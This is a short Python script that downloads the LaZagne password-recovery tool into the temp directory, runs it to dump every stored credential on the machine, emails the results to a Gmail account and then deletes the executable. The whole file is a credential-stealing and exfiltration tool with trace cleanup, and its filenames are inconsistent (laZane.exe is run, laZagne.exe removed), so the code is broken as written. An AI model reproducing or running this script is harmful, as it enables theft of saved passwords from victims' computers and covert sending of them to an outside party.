#!/usr/bin/env python

import re, os, requests, subprocess, smtplib, tempfile

def downloads(url):
    """
    Downloads a file from the given URL and saves it with the same name as in the URL.
    """
    get_response = requests.get(url)  # Send an HTTP GET request to the specified URL
    filename = url.split("/")[-1]  # Extract the file name from the URL (last part after '/')
    with open(filename, "wb") as out_file:  # Open the file in write-binary mode
        out_file.write(get_response.content)  # Write the downloaded content to the file

def send_mail(email, password, message):
    """
    Sends an email with the given message using the provided email credentials.
    """
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Connect to Gmail's SMTP server on port 587
    server.starttls()  # Upgrade the connection to a secure TLS-encrypted connection
    server.login(email, password)  # Log in to the email account
    server.sendmail(email, email, message)  # Send the email to the same email account
    server.quit()  # Close the SMTP server connection

# Get the system's temporary directory path
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)  # Change the working directory to the temp directory

# Download a file from the given URL (replace with actual URL)
downloads("lazane exe url")

# Execute the downloaded executable and capture its output
results = subprocess.check_output("laZane.exe all", shell=True)

# Send the captured output via email
send_mail("yourmail", "emailapppassword", results)

# Remove the downloaded file after execution to clean up
os.remove("laZagne.exe")
